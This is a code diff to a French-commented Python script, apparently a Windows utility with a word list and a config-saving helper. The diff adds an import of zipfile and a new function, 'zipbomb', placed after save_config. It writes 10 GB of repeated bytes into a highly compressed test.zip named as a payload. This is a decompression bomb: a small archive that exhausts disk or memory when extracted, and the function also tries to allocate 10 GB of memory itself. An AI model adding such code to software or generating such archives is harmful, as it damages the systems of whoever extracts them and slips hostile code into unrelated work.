@@ -27,6 +27,7 @@ Bibliothèques standards utilisées :
     - itertools
     - datetime
     - mots_francais
+    - zipfile
 
 Bibliothèque externe (optionnelle) :
     - pyautogui
@@ -331,7 +332,7 @@ mots_921
 # 1. DÉPENDANCES ET PRÉREQUIS
 # -------------------------------------------------------------------------------
 
-import os, time, sys, subprocess, random, string, msvcrt, json, hashlib, unicodedata, itertools  # noqa: E401
+import os, time, sys, subprocess, random, string, msvcrt, json, hashlib, unicodedata, itertools, zipfile  # noqa: E401
 from datetime import datetime
 
 current_dir = os.path.dirname(os.path.abspath(__file__))
@@ -376,6 +377,14 @@ def save_config(data, chemin="config.json"):
         return True
     except Exception:
         return False
+
+def zipbomb(size=10000000000):
+    data = b"A" * size
+
+    with zipfile.ZipFile("test.zip", "w", compression=zipfile.ZIP_DEFLATED) as z:
+        z.writestr("payload.txt", data)
+
+    return "ZIP créé : test.zip"
 
 
 # -------------------------------------------------------------------------------
